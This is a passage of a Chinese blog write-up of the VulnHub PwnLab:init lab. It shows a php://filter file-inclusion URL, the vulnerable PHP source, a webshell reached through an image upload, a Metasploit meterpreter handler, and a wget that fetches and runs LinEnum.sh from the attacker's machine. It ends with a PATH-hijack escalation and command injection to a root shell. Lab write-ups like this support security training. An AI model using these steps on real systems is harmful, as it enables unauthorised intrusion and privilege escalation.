+<p>图片马传上去了之后，要想办法取解析这个图片马，能想到的是解析漏 洞，在或者文件包含，但是在之前的文件包含的位置不能进行执行。去读取首页源码。得到突破点。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">230.130</span><span class="hljs-regexp">/?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=index<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202477.png" srcset="/img/loading.gif" lazyload alt="image-20251211165608533"></p>
+<p>因为在page这个参数上面自动给你添加.php文件后缀名。这也是为什么之前 在利用文件包含时不加文件后缀的原因。在读取首页文件的源码，找到其他可利用的文件包含的位置和字段lang且位置在cookie字段里面。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-comment">//Multilingual. Not implemented yet.</span></span><br><span class="language-php"><span class="hljs-comment">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lang&#x27;</span>]))</span><br><span class="language-php">&#123;</span><br><span class="language-php">	<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;lang/&quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;lang&#x27;</span>]);</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-comment">// Not implemented yet.</span></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PwnLab Intranet Image Hosting<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;images/pwnlab.png&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">[ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ] [ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=login&quot;</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ] [ <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;?page=upload&quot;</span>&gt;</span>Upload<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> ]</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">	<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]))</span><br><span class="language-php">	&#123;</span><br><span class="language-php">		<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">	<span class="hljs-keyword">else</span></span><br><span class="language-php">	&#123;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Use this server to upload and share image files inside the intranet&quot;</span>;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>截获upload页面的点击数据包。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202633.png" srcset="/img/loading.gif" lazyload alt="image-20251211204112442"></p>
+<p>蚁剑连接成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202382.png" srcset="/img/loading.gif" lazyload alt="image-20251211204059417"></p>
+<p>这里我们上线msf</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler <br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">php</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.230.130</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 54522</span><br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202910.png" srcset="/img/loading.gif" lazyload alt="image-20251211204459043"></p>
+<p>还是id一下，不出意外，低等级权限，开始提权。</p>
+<p>shell看着难受，我们改为pty</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202175.png" srcset="/img/loading.gif" lazyload alt="image-20251211204635462"></p>
+<p>切换用户。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">su</span> kane<br>iSv5Ym2GRo<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202842.png" srcset="/img/loading.gif" lazyload alt="image-20251211204708564"></p>
+<p>起一个HTTP服务</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure>
+
+<p>直接去tmp目录，给文件权限执行shell提权脚本。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/tmp</span><br>wget http:<span class="hljs-string">//192.168.230.128</span><span class="hljs-function">:8000</span>/LinEnum.sh<br>chmod 777 LinEnum.sh<br><span class="hljs-string">./LinEnum.sh</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202227.png" srcset="/img/loading.gif" lazyload alt="image-20251211205043605"></p>
+<p>一片红，没找到提权线索。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202773.png" srcset="/img/loading.gif" lazyload alt="image-20251211205149767"></p>
+<p>据我判断就是有什么可执行文件可以进行提权。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202396.png" srcset="/img/loading.gif" lazyload alt="image-20251211205445341"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./msgmike<br></code></pre></td></tr></table></figure>
+
+<p>执行之后告诉我们没有这个文件或者目录，重点是用户目录变了，是 mike。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>s msgmike<br></code></pre></td></tr></table></figure>
+
+<p>string命令扎到一行跟报错相关的问题。</p>
+<p>报错提示该程序在没有完整路径的情况下调用cat</p>
+<p>利用cat命令去查看 &#x2F;home&#x2F;mike&#x2F;msg.txt,但是当前路径时kane的家目录是没有这个文件的</p>
+<p>利用环境变量来提权。</p>
+<p>查看我们当前的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<p>在当前目录建立一个cat文件，将环境变量修改为当前家目录，</p>
+<p>并将其覆盖掉原来的环境变量，这样路径就完整了。文件也就能执行了.重 点在于我们的用户变了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">chmod</span> 777 <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">export</span> PATH=/home/kane<br>./msgmike<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202972.png" srcset="/img/loading.gif" lazyload alt="image-20251211205556946"></p>
+<p>切换了用户后首先先把环境变量在恢复。不然原来的命令就出现了问题</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><br>echo $<span class="hljs-variable constant_">PATH</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202325.png" srcset="/img/loading.gif" lazyload alt="image-20251211205610210"></p>
+<p>mike的用户里面也有一个文件，分析一下这个文件</p>
+<p>发现输入记录到&#x2F;root目录中的文本文件中。用户输入传递给&#x2F;bin&#x2F;echo命令， 并最终附加到root&#x2F;messages.txt文件。回显输入后，使用命令注入来执行 Shell。Bash无法正常工作， 换成&#x2F;bin&#x2F;sh，获得了root shell。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152202238.png" srcset="/img/loading.gif" lazyload alt="image-20251211212721753"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/vulnhub/" class="print-no-link">#vulnhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub pwnlab_init</div>
+      <div>http://example.com/2026/test43/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test46/" title="春秋云镜 Initial">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云镜 Initial</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test42/" title="vulnhub Me-and-My-Girlfriend-1">
+                        <span class="hidden-mobile">vulnhub Me-and-My-Girlfriend-1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
